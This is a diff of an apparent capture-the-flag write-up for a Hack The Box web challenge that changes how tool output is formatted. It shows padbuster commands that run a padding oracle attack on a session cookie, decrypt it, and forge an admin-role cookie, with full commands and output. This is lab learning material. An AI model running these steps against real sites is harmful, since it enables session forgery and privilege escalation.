@@ -12,14 +12,15 @@ STEP 1
 padbuster http://docker.hackthebox.eu:37742 zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D --cookies "PHPSESSID=7d5guetet0tj3o1kn8lrd77da0;iknowmag1k=zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D" 8 --encoding=0
 ```
 
-*** Response Analysis Complete ***
 
-The following response signatures were returned:
+`*** Response Analysis Complete ***`
+
+`The following response signatures were returned:`
 
 
-ID# Freq Status Length Location
+`ID# Freq Status Length Location`
     
-1 256 302 0 profile.php
+`1 256 302 0 profile.php`
 
 
 STEP 2
@@ -28,13 +29,13 @@ STEP 2
 padbuster http://docker.hackthebox.eu:37742/profile.php zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D --cookies "PHPSESSID=7d5guetet0tj3o1kn8lrd77da0;iknowmag1k=zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D" 8 --encoding=0
 ```
 
-*** Finished ***
+`*** Finished ***`
 
-[+] Decrypted value (ASCII): {"user":"bdmin","role":"user"}
+`[+] Decrypted value (ASCII): {"user":"bdmin","role":"user"}`
 
-[+] Decrypted value (HEX): 7B2275736572223A2262646D696E222C22726F6C65223A2275736572227D0202
+`[+] Decrypted value (HEX): 7B2275736572223A2262646D696E222C22726F6C65223A2275736572227D0202`
 
-[+] Decrypted value (Base64): eyJ1c2VyIjoiYmRtaW4iLCJyb2xlIjoidXNlciJ9AgI=
+`[+] Decrypted value (Base64): eyJ1c2VyIjoiYmRtaW4iLCJyb2xlIjoidXNlciJ9AgI=`
 
 
 STEP 3
@@ -43,9 +44,9 @@ STEP 3
 padbuster http://docker.hackthebox.eu:37742/profile.php zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D --cookies "PHPSESSID=7d5guetet0tj3o1kn8lrd77da0;iknowmag1k=zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D" 8 --encoding=0 --plaintext "{\"user\":\"admin\",\"role\":\"admin\"}"
 ```
 
-*** Finished ***
+`*** Finished ***`
 
-[+] Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D
+`[+] Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D`
 
 
 STEP 4
